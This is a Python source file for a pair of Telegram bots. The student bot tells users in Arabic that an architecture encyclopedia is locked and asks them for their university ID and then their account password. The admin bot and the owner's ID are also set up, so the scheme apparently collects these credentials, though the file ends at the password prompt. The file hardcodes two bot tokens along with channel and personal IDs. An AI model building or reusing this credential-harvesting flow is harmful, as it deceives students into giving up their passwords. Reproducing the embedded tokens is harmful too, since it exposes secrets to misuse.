import os
import telebot
from telebot import types

TOKEN_STUDENT = "8753263807:AAFO9rKx7yy4MeQyBbCBLnwkQvPo57v5qyw"
TOKEN_ADMIN = "8507731905:AAE-ke_vMTR2V3Yz4w3i4kTR7H-yX2JAmmE"
CHANNEL_ID = "-1002493393930"
MY_PERSONAL_ID = 2038606299

student_bot = telebot.TeleBot(TOKEN_STUDENT, threaded=False)
admin_bot = telebot.TeleBot(TOKEN_ADMIN, threaded=False)

approved_users = set()
user_data = {}

@student_bot.message_handler(commands=['start'])
def handle_start(message):
    uid = message.from_user.id
    if uid in approved_users:
        show_approved_menu(uid)
        return
    try:
        status = student_bot.get_chat_member(CHANNEL_ID, uid).status
        if status in ['member', 'administrator', 'creator']:
            approved_users.add(uid)
            show_approved_menu(uid)
            return
    except:
        pass
        
    student_bot.send_message(uid, "🔒 مرحباً بك في موسوعة العمارة.\nالمحتوى مقفل حالياً؛ الرجاء إدخال بياناتك الأكاديمية للمطابقة والتفعيل.\n\n🎓 الرجاء كتابة رقمك الجامعي الآن:")
    student_bot.register_next_step_handler(message, get_uni_id)

def get_uni_id(message):
    uid = message.from_user.id
    uni_id = message.text.strip()
    user_data[uid] = {"uni_id": uni_id}
    student_bot.send_message(uid, "🔑 ممتاز، الآن الرجاء كتابة كلمة المرور الخاصة بحسابك:")
    student_bot.register_next_step_handler(message, get_password)
